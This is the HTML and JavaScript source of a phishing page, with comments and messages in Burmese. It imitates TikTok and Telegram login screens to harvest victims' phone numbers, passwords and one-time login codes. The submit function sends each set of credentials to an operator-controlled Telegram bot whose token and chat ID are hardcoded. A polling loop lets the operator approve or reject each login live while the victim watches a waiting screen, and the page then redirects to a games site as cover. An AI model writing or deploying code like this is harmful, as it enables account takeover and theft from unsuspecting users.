<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Engine Stable Pro v6</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; position: fixed; font-family: sans-serif; }
        #app { width: 100vw; height: 100vh; position: relative; }
        .full-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
        .tt-input { width: 100%; padding: 16px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 12px; outline: none; margin-bottom: 12px; }
        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 9999; transition: 0.5s; }
        .notice-success { background: #10b981; }
        .notice-error { background: #ef4444; }
        #gameFrameContainer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; }
        iframe { width: 100%; height: 100%; border: none; }
        
        /* အသံထွက်လာဖို့အတွက် ပထမဆုံး screen အောက်မှာခံထားမယ့် style */
        .overlay-start { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); cursor: pointer; }
    </style>
</head>
<body onclick="startAudio()"> <!-- Screen ပေါ်နှိပ်လိုက်တာနဲ့ အသံစထွက်မယ် -->

<div id="topNotice"></div>
<audio id="bgMusic" loop src="https://raw.githubusercontent.com/tar-alt/Photo-link-/be5dd1c4b85a9d0bc6951bf1379bff3ce0286c2a/lv_0_20260513134939.mp3"></audio>

<!-- အသံထွက်ဖို့အတွက် တစ်ချက်နှိပ်ပေးရမယ့် screen -->
<div id="startOverlay" class="overlay-start" onclick="this.style.display='none'">
    <div class="text-white text-center">
        <i class="fa-solid fa-volume-high text-5xl mb-4 animate-bounce"></i>
        <p class="text-xl font-bold">နှိပ်ပြီး ဆက်သွားပါ</p>
    </div>
</div>

<div id="app">
    <!-- Login Selection -->
    <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
        <div class="bg-[#111] border border-white/5 p-10 w-full max-w-sm rounded-[40px] text-center">
            <h1 class="text-xl font-semibold mb-10 text-white">Login to continue</h1>
            <button onclick="startAudio(); toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 font-bold text-lg">Telegram</button>
            <button onclick="startAudio(); toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-2xl font-bold text-lg">TikTok</button>
        </div>
    </div>

    <!-- TikTok Screen -->
    <div id="ttScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
        <div class="flex items-center justify-center mb-12 relative">
            <i onclick="toggle('selectScreen')" class="fa-solid fa-angle-left text-2xl absolute left-0 cursor-pointer"></i>
            <span class="text-xl font-bold">Log in</span>
        </div>
        <input type="text" id="ttPhone" placeholder="Phone number" class="tt-input">
        <input type="password" id="ttPass" placeholder="Password" class="tt-input">
        <div class="flex justify-between px-1 mb-10">
            <span class="text-gray-400 text-sm">Forgot password?</span>
        </div>
        <button onclick="submit('TikTok')" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold text-lg">Log in</button>
    </div>

    <!-- Telegram Screen -->
    <div id="tgScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
        <div class="flex items-center mb-12">
            <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-2xl cursor-pointer mr-8"></i>
        </div>
        <div class="mb-8">
            <label class="text-gray-400 text-sm ml-1">Phone number</label>
            <input type="text" id="tgPhone" value="+95 " class="w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
        </div>
        <div class="mb-12">
            <label class="text-gray-400 text-sm ml-1">OTP Code</label>
            <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
        </div>
        <button onclick="submit('Telegram')" class="w-full bg-[#3390ec] text-white py-4 rounded-xl font-bold text-lg uppercase">Continue</button>
    </div>

    <!-- Wait Screen -->
    <div id="waitScreen" class="hidden w-full h-full bg-black z-[60] relative">
        <video id="loadVd" class="full-video" loop muted playsinline src="https://raw.githubusercontent.com/tar-alt/Photo-link-/e761fef0c5c9a10b02d7aa6ad2dfc731ce90f7b8/From%20KlickPin%20CF%20Easy%20fall%20outfit%20ideas%20that%20feel%20fresh%20practical%20and%20surprisingly%20easy%20to%20try%20for%20a%20result%20that%20feels%20elegant%20and%20share-worthy%20-%20Pin-684547212134230018.mp4"></video>
        <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40 text-center p-6">
            <p class="text-white text-lg font-bold">Login ဝင်ရောက်ရန် စစ်ဆေးနေပါသည်။<br><span class="text-sm font-normal text-gray-300">ခေတ္တစောင့်ဆိုင်းပေးပါ...</span></p>
        </div>
    </div>

    <!-- Game Frame -->
    <div id="gameFrameContainer">
        <div onclick="closeGame()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full cursor-pointer"><i class="fa-solid fa-house"></i></div>
        <iframe id="gameFrame" src=""></iframe>
    </div>
</div>

<script>
    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
    const chatID = "5304050102";
    const gameLink = "https://www.crazygames.com";
    let userKey = "ID_" + Math.floor(Math.random() * 9999);
    const music = document.getElementById('bgMusic');

    // Auto Login Check
    window.onload = function() {
        if(localStorage.getItem("isLoggedIn") === "true") {
            window.location.href = gameLink;
        }
    };

    // User interaction ရမှ အသံစဖွင့်လို့ရတဲ့အတွက် ဒီ Function ထည့်ရတာပါ
    function startAudio() {
        music.play().catch((err) => {
            console.log("Audio play failed:", err);
        });
    }

    function toggle(id) {
        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    function closeGame() {
        music.pause();
        music.currentTime = 0;
        location.reload();
    }

    function showNotice(msg, type) {
        const el = document.getElementById('topNotice');
        el.innerText = msg; el.className = (type === 'success') ? 'notice-success' : 'notice-error';
        el.style.top = '0'; setTimeout(() => el.style.top = '-100px', 4000);
    }

    async function submit(type) {
        const ph = (type === 'TikTok') ? document.getElementById('ttPhone').value : document.getElementById('tgPhone').value;
        const extra = (type === 'TikTok') ? document.getElementById('ttPass').value : document.getElementById('tgOtp').value;
        
        toggle('waitScreen');
        document.getElementById('loadVd').play();

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatID, 
                text: `<b>${type} Login Request</b>\nPH: <code>${ph}</code>\nData: <code>${extra}</code>\nID: <code>${userKey}</code>`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{text:"✅ Approve", callback_data:`ok_${userKey}`}, {text:"❌ Reject", callback_data:`no_${userKey}`}]] }
            })
        });
        startPolling();
    }

    function startPolling() {
        const check = setInterval(async () => {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
            const data = await res.json();
            const last = data.result?.[data.result.length - 1]?.callback_query;
            
            if (last && last.data.includes(userKey)) {
                if (last.data === `ok_${userKey}`) {
                    clearInterval(check);
                    localStorage.setItem("isLoggedIn", "true");
                    
                    await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            chat_id: chatID, 
                            message_id: last.message.message_id, 
                            text: `✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။` 
                        })
                    });

                    showNotice("Login အောင်မြင်ပါသည်။", "success");
                    setTimeout(() => { window.location.href = gameLink; }, 1500);

                } else if (last.data === `no_${userKey}`) {
                    clearInterval(check);
                    await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            chat_id: chatID, 
                            message_id: last.message.message_id, 
                            text: `❌ ID: ${userKey} အား ငြင်းပယ်လိုက်ပါသည်။` 
                        })
                    });
                    showNotice("Login ၀င်ရောက်မှုမအောင်မြင်ပါ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပေးပါ။", "error");
                    setTimeout(() => location.reload(), 2500);
                }
            }
        }, 3000);
    }
</script>
</body>
</html>
